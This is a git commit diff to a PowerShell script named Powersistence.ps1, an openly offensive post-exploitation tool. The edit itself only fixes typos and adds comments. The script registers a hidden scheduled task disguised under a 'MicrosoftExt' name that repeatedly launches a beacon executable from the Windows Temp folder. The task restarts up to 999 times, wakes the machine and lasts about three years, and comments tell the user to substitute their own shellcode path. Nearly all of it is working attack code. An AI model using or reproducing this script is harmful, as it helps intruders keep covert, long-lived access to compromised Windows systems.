9137a5d53d67aac5399da71e361764818f1a1791
Suljot Gjoka <58447776+pi0x73@users.noreply.github.com>
2021-11-10 16:56:36 +0100

    Update Powersistence.ps1

--- Powersistence.ps1
+++ Powersistence.ps1
@@ -1,16 +1,16 @@
 ##POWERSHELL SCRIPT TO SET-UP PERSISTENCE ON A TARGET AFTER THE INITIAL HIT.
-##DO NOT USE FOR ILLEGL PURPOSES
+##DO NOT USE FOR ILLEGAL PURPOSES
 
-echo [+]Creating Task...
+echo "[+]Creating Task..."
 
 #action
 $taskAction = New-ScheduledTaskAction `
-    -Execute 'C:\Windows\Temp\beacon.exe'
+    -Execute 'C:\Windows\Temp\beacon.exe' #EDIT USING YOUR OWN SHELLCODE PATH ON TARGET
 
 #triggering
 $trigger = New-ScheduledTaskTrigger `
     -Daily `
-    -At 11:00AM 
+    -At 11:00AM #INITIAL TASK EXECUTION TIME
 
 $settings = New-ScheduledTaskSettingsSet `
     -Hidden `
@@ -19,20 +19,20 @@ $settings = New-ScheduledTaskSettingsSet `
     -StartWhenAvailable `
     -RunOnlyIfNetworkAvailable `
     -WakeToRun `
-    -RestartCount 999 `
-    -RestartInterval (New-TimeSpan -Minutes 1)
+    -RestartCount 999 ` #TIMES TO RESTART THE TASK IF IT FAILS 
+    -RestartInterval (New-TimeSpan -Minutes 1) 
 
 #creation
 $task = Register-ScheduledTask `
     -Action $taskAction `
     -Trigger $trigger `
     -TaskName "MicrosoftExt\Powersistence" `
-    -Description "REMAIN PERSISTENT!!!" `
+    -Description "Peristence Goes Brr..." `
     -Settings $settings
 
 #repetition
-$task.Triggers.Repetition.Duration = "P1075D"
-$task.Triggers.Repetition.Interval = "PT5M"
+$task.Triggers.Repetition.Duration = "P1075D" #TASK LIFESPAN
+$task.Triggers.Repetition.Interval = "PT5M" #TASK REPEATING INTERVAL
 $task | Set-ScheduledTask
 
-echo [+] Task Created!
+echo "[+] Task Created!"
